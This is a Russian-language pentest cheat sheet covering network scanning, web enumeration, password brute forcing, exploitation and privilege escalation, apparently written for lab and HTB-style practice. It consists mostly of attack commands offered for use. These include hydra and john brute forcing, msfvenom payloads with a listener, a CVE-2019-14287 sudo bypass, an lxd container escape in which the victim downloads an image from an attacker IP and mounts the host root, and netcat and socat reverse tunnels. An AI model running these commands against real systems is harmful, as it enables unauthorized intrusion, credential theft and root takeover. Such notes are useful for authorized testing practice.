===== PENTEST =====
Цель — Получить доступ к внутренней сети и хостам, которые находятся в ней.
Подход: Network Scanning -> Enumeration -> Exploitation -> Privilege Escalation

===== Network Scanning =====
###ping scan
netdiscover
nmap
masscan
nmap -sn 127.0.0.1/0 
nmap -sn -e <интерфейс> --min-parallelism <количество-воркеров> <IP-адрес/диапазон-IP>
masscan -p0 --rate <скорость> -e <интерфейс> <IP-адрес/диапазон-IP>
arp-scan -I eth1 --localnet

###port scan 
nmap -sV -sS -A 127.0.0.1 --script vuln #tcp
nmap -sV -sS -A -p- 127.0.0.1 --script vuln # all tcp ports
nmap -sV -sS -A -sU 127.0.0.1 # udp ports


===== Enumeration =====
###Запуск сканеров веб уязвимостей (Пример: OWASP ZAP)
###dirb директорий на сайте
dirb http://host -X .php,.zip
gobuster dir -u <URL> -w <wordlist-file>
wfuzz -c -z file,<wordlist-file> --hc 404 <URL>/FUZZ
nikto -h <host>
###перебор суб доменов и получение информации о A записях, если развернут dns
dig @127.0.0.1 greenoptic.vm axfr
gobuster vhost -u test.dns -w /usr/share/wordlists/dirb/big.txt

###search
---
msf 
search <VULNNAME or soft Version>
---
exploitdb 

###brute
fcrackzip -D -p /usr/share/wordlists/rockyou.txt -u backup.zip #brute archive
john --wordlist=/usr/share/wordlists/rockyou.txt hash #hash brute
hydra -L <путь к списку пользователей> -P <путь к списку паролей> <URL> -s 8080 -t 64 http-get /<путь к защищенному ресурсу> #basic auth brute

###anon access
smbclient -L \\host # 
ftp
ssh, welcome message



===== Exploitation =====
msfconsole #show options, show advanced
msfvenom -p [пейлоад] [параметры пейлоада] -f [формат] -o [итоговый файл] #создание полезной нагрузки https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/msfvenom
exploit/multi/handler #необходио включить слушателя с параметрами как в msfvenom
exploitdb #использовать эксплоиты из exploitdb
python3 -c 'import pty;pty.spawn("/bin/bash")'



===== Privilege Escalation =====
https://github.com/carlospolop/PEASS-ng.git #чек системы на повышение привелегий

	sudo -l #Команда sudo -l используется для проверки привилегий пользователя в системе, особенно в контексте команды sudo (Superuser do). При выполнении команды sudo -l пользователь может узнать список команд или правил, которые он может выполнять с привилегиями суперпользователя.
	find / -perm -u=s -type f 2>/dev/null # поиск по файловой системе файлов, которые созданы рутом, и у нас есть привилегии на запуск
	find / type -f -user root -perm -u=s 2> /dev/null
	getcap -r / 2>/dev/null
#getcap - это команда для получения информации об атрибутах capabilities файлов.
#-r / указывает на рекурсивный поиск файлов по всей файловой системе, начиная с корневого каталога ("/").
#2>/dev/null используется для перенаправления сообщений об ошибках (stderr) в никуда (устройство /dev/null), чтобы избежать вывода ошибок в консоль.
	find / -name "root.txt" 2>/dev/null #Найти файл
	если при sudo -l видим "someuser ALL=(ALL, !root) /usr/bin/somecommand" это отсылает на CVE-2019-14287 и мы можем все таки запустить команду от рута, если выполним: sudo -u#-1 /usr/bin/somecommand + какой-то конкретный файл как в htb с кроликом

### Повышение через lxd контейнер
--- Выолняем на своей машине ---
git clone https://github.com/saghul/lxd-alpine-builder.git 
cd lxd-alpine-builder
./build-alpine # собираем алпайн контейнер
python2 -m SimpleHTTPServer # запускаем в папке где мы создали контейнер http сервер
--- На уязвимом хосте ---
wget http://192.168.1.107:8000/alpine-v3.10-x86_64-20191019_0712.tar.gz
lxc image import ./alpine-v3.10-x86_64-20191019_0712.tar.gz --alias myimage # импортим образ
lxc image list # проверяем что импорт прошел успешно 
lxc init myimage ignite -c security.privileged=true # инициализирем контейнер
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true # монтируем / как диск 
lxc start ignite # запускаем контейнер
lxc exec ignite /bin/sh # заходим в контейнер, переходим в папку где примонтирован /



####ТУНЕЛИ####
Создание SSH туннеля: ssh -D <локальный порт> -p <порт> <пользователь>@<удаленный хост>
Прямой туннель: ssh -L <локальный порт>:<удаленный хост>:<удаленный порт> <пользователь>@<удаленный хост>
Обратный туннель: ssh -R <удаленный порт>:<локальный хост>:<локальный порт> <пользователь>@<удаленный хост>
Прямой туннель: socat TCP-LISTEN:<локальный порт>,fork TCP:<удаленный хост>:<удаленный порт>
Обратный туннель: socat TCP-LISTEN:<удаленный порт>,fork TCP:<локальный хост>:<локальный порт>
Прямой туннель: nc -l -p <локальный порт> -c 'nc <удаленный хост> <удаленный порт>'
Обратный туннель: nc -l -p <удаленный порт> -c 'nc <локальный хост> <локальный порт>'